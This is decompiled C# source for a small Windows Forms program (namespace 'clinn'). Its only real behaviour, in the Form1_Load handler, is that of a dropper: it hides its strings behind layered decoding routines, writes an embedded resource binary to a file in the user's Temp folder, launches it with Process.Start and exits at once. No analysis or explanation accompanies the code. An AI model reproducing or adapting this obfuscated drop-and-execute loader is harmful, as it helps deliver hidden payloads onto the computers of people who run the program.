using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using clinn.My.Resources;

namespace clinn;

[DesignerGenerated]
public class Form1 : Form
{
	private IContainer icontainer_0;

	private int int_0;

	public Form1()
	{
		((Form)this).add_Load((EventHandler)Form1_Load);
		method_0();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && icontainer_0 != null)
			{
				icontainer_0.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void method_0()
	{
		((Control)this).SuspendLayout();
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		Size clientSize = new Size(284, 262);
		((Form)this).set_ClientSize(clientSize);
		((Control)this).set_Name(Class6.smethod_0(Class8.smethod_0(Class10.smethod_0("\ue662\ue64b\ue656\ue649\ue615", 59712), 63319), 63619));
		((Form)this).set_Text(Class6.smethod_0(Class8.smethod_0(Class10.smethod_0("\ue662\ue64b\ue656\ue649\ue615", 59712), 63319), 63619));
		((Control)this).ResumeLayout(false);
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	private void Form1_Load(object sender, EventArgs e)
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		string text = default(string);
		string temp = default(string);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0007;
				case 165:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0007;
						case 3:
							goto IL_0015;
						case 4:
							goto IL_002d;
						case 5:
							goto IL_005a;
						case 6:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 7:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_005a:
					num = 5;
					File.WriteAllBytes(text, Resources.Byte_0);
					break;
					IL_0007:
					num = 2;
					int_0 = 1000;
					goto IL_0015;
					IL_0015:
					num = 3;
					temp = ((ServerComputer)Class1.Class0_0).get_FileSystem().get_SpecialDirectories().get_Temp();
					goto IL_002d;
					IL_002d:
					num = 4;
					text = temp + Class6.smethod_0(Class8.smethod_0(Class10.smethod_0("\ue6ee\ue6f8\ue6ef\ue6eb\ue6f8\ue6ef\ue6b3\ue6f8\ue6e5\ue6f8", 61773), 63725), 61315);
					goto IL_005a;
					end_IL_0000_2:
					break;
				}
				num = 6;
				Process.Start(text);
				ProjectData.EndApp();
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 165;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}
}
